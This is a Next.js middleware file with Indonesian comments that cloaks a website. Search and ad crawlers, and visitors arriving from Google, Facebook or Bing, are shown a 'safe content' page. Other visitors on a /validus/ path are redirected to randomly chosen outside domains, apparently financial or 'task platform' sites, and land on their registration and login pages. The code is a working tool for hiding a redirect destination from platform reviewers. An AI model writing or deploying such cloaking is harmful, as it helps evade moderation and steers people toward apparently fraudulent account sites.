import { NextResponse } from 'next/server';

// ===============================================
// 1. KONFIGURASI KHUSUS ANDA
// ===============================================

// JALUR UTAMA YANG MENGAKTIFKAN PENGALIHAN
const ACTIVE_REDIRECT_PATH = '/validus/'; 

// URL TARGET ACARA (3 Domain Dasar, TIDAK termasuk path)
const TARGET_DOMAINS = [
    "https://ventureidven.com",
    "https://akunfinansial.com",
    "https://platformtugas.com"
];

// USER AGENT BOT/CRAWLER
const BOT_AGENTS = ["googlebot", "bingbot", "yahoo! slurp", "adsbot", "facebookexternalhit"];

// SUMBER MENCURIGAKAN (Referer)
const SUSPICIOUS_REFERERS = ["google.com", "facebook.com", "bing.com"];


export default function middleware(request) {
    const url = new URL(request.url);
    const pathname = url.pathname.toLowerCase();
    const userAgent = request.headers.get('user-agent')?.toLowerCase() || '';
    const referer = request.headers.get('referer')?.toLowerCase() || '';

    let isBot = false;

    // A. Pengecekan Bot/Crawler
    for (const bot of BOT_AGENTS) {
        if (userAgent.includes(bot)) {
            isBot = true;
            break;
        }
    }
    for (const ref of SUSPICIOUS_REFERERS) {
        if (referer.includes(ref)) {
            isBot = true;
            break;
        }
    }

    // B. Pengecekan Path: Apakah dimulai dengan /validus/
    const isCorrectBasePath = pathname.startsWith(ACTIVE_REDIRECT_PATH);


    // ===============================================
    // 3. EKSEKUSI
    // ===============================================
    
    // KONDISI 1: JALUR BENAR DAN BUKAN BOT (HUMAN)
    if (isCorrectBasePath && !isBot) {
        
        // 1. Pilih Domain Dasar Secara Acak
        const randomIndex = Math.floor(Math.random() * TARGET_DOMAINS.length);
        const randomBaseDomain = TARGET_DOMAINS[randomIndex];

        // 2. Ambil Sisa Path Setelah '/validus/'
        // Contoh: '/validus/daftar' -> '/daftar'
        const remainingPath = pathname.substring(ACTIVE_REDIRECT_PATH.length - 1); // Hasilnya: /daftar atau /home dll.

        // 3. Gabungkan Domain Dasar + Sisa Path
        // randomBaseDomain (misal: https://ventureidven.com) + remainingPath (misal: /daftar)
        // Hasilnya: https://ventureidven.com/daftar
        let finalRedirectUrl = randomBaseDomain + remainingPath;

        // 4. Lakukan Penggantian (Path Mapping)
        // Kita harus mengubah path: /daftar -> /index/user/register

        if (finalRedirectUrl.endsWith('/daftar')) {
            finalRedirectUrl = finalRedirectUrl.replace('/daftar', '/index/user/register');
        } else if (finalRedirectUrl.endsWith('/home')) {
            finalRedirectUrl = finalRedirectUrl.replace('/home', '/index/my/index');
        } else if (finalRedirectUrl.endsWith('/login')) {
            finalRedirectUrl = finalRedirectUrl.replace('/login', '/index/user/login');
        } 
        
        // KONDISI KHUSUS: Jika hanya /validus/, kita arahkan ke root domain tujuan.
        else if (finalRedirectUrl.endsWith('/validus/')) {
            finalRedirectUrl = randomBaseDomain + '/';
        }


        // Lakukan Pengalihan 302
        return NextResponse.redirect(finalRedirectUrl, 302);
    } 
    
    // KONDISI 2: JALUR SALAH ATAU TERDETEKSI BOT
    // Tampilkan Konten Aman
    return NextResponse.rewrite(new URL('/index.html', url)); 
}

// Konfigurasi agar Middleware berjalan di SEMUA PATH
export const config = {
    matcher: ['/:path*'],
};
